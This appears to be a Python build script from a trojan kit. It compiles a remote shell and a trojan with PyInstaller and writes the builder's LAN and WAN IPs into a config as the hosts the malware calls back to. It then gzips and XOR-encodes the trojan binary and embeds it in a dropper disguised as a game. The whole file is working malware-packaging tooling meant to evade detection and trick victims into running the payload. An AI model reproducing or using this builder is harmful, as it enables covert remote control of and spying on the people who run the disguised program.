import os
import sys
import json
import subprocess
import platform
import pprint
import shutil
import gzip
import logging
logger = logging.getLogger(__name__)

default_settings = {
        'host': ['localhost'],
        'port': 50008,
        }

module_list  = {
        'pyscreenshot': 'pyscreenshot',
        'wxpython':     'wx',
        'pillow':       'PIL',
        }
shell_name   = 'shell_r'
trojan_name  = 'trojan_r'
dropper_name = 'game_r'

def check_modules():
    error = False
    try:
        print('checking pyinstaller.exe')
        program = search_pyinstaller()
    except:
        print('pyinstaller.exe not found')
        print('* pip install pyinstaller')
        error = True
    try:
        print('checking pyscreenshot')
        import pyscreenshot
    except:
        try:
            print('checking wxPython')
            import wx
        except:
            print('wx and pyscreenshot import failed')
            print('* pip install wxpython')
            print('* pip install pyscreenshot')
    try:
        print('checking pillow')
        import PIL
    except:
        print('PIL not found')
        print('* pip install pillow')
    if error:
        sys.exit(1)

def check_source_code():
    pathlist = []
    pathlist.append(os.path.abspath(os.path.dirname(sys.argv[0])))
    pathlist.append(os.getcwd())
    print('search:', pathlist)
    for path in pathlist:
        err_name = []
        for name in [trojan_name, shell_name]:
            if not os.path.exists(os.path.join(path, name + '.py')):
                err_name.append(name + '.py')
            else:
                print(name + '.py', 'found')
        if not err_name:
            return path
    print('Source code not found')
    print('Usage: %s [pyTrojan_path]' % sys.argv[0])
    sys.exit(1)

def collect_info(IPs=[]):
    import myip
    settings   = dict(default_settings)
    if not IPs:
        localip    = myip.myip_lan()
        globalip   = myip.myip_wan()
        IPs        = [localip, globalip]
    settings['host'] = IPs + settings['host']
    return settings

def build_config(pyFileName=None, IPs=[]):
    if not pyFileName:
        pyFileName = 'config.py'
    if os.path.isdir(pyFileName):
        pyFileName = os.path.join(pyFileName, 'config.py')
    settings = collect_info(IPs)
    with open(pyFileName, 'w') as fp:
        for key, value in settings.items():
            fp.write('%s = %s\n' % (key, json.dumps(value)))

def search_pyinstaller():
    program = 'pyinstaller'
    if platform.system() == 'Windows':
        if os.path.exists('Scripts\\pyinstaller.exe'):
            program = 'Scripts\\pyinstaller.exe'
        elif os.path.exists('pyinstaller.exe'):
            program = 'pyinstaller.exe'
        else:
            raise FileNotFoundError('pyinstaller.exe')
    return program

def clean_old():
    cleanlist = ['dist', 'payload', 'dropper']
    for path in cleanlist:
        if os.path.exists(path):
            shutil.rmtree(path)

def build_exe(fileName):
    pyinstaller = search_pyinstaller()
    if os.path.exists(fileName):
        pass
    elif os.path.exists(fileName + '.py'):
        fileName += '.py'
    else:
        raise FileNotFoundError(fileName)
    logger.error('building: %s --onefile %s', pyinstaller, fileName)
    subprocess.run([pyinstaller, '--onefile', fileName])

def build_all_exe(path):
    if not os.path.exists(path):
        raise FileNotFoundError(path)
    for name in [shell_name, trojan_name]:
        fullName = os.path.join(path, name)
        logger.error('building %s', fullName)
        build_exe(fullName)

def encrypt_trojan(path):
    fileName = os.path.join('dist', trojan_name)
    if os.path.exists(fileName):
        trojan_exe = fileName
    elif os.path.exists(fileName + '.exe'):
        trojan_exe = fileName + '.exe'
    else:
        raise FileNotFoundError(fileName)
    dropper_path = os.path.join(path, 'dropper')
    if not os.path.exists(dropper_path):
        os.makedirs(dropper_path)
    outputName    = os.path.basename(trojan_exe).replace('.', '_')
    trojan_exe_py = os.path.join(dropper_path, outputName + '.py')
    with open(trojan_exe_py, 'w') as fp:
        trojan_bin = open(trojan_exe, 'rb').read()
        trojan_gz  = gzip.compress(trojan_bin)
        trojan_enc = bytes([i ^ 0x44 for i in trojan_gz])
        fp.write('gzipped = %s' % str(trojan_enc))
    return trojan_exe_py

def build_game(path):
    fullName    = os.path.join(path, dropper_name)
    logger.error('building %s', fullName)
    build_exe(fullName)

if __name__ == '__main__':
    check_modules()
    path = check_source_code()
    clean_old()
    build_config(path, IPs=sys.argv[1:])
    build_all_exe(path)
    encrypt_trojan(path)
    build_game(path)
